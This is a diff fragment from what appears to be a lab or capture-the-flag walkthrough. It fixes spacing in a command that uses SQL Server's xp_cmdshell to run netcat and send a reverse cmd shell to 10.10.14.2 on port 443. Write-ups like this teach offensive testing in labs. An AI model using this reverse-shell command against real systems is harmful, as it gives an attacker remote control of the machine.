@@ -457,7 +457,7 @@ output
 
 100 59392  100 59392    0     0   167k      0 --:--:-- --:--:-- --:--:--  168k
 
-SQL> xp_cmdshell"C:\Temp\nc.exe -e cmd 10.10.14.2 443"
+SQL> xp_cmdshell "C:\Temp\nc.exe -e cmd 10.10.14.2 443"
 ```
 
 ### User Privilege Escalation
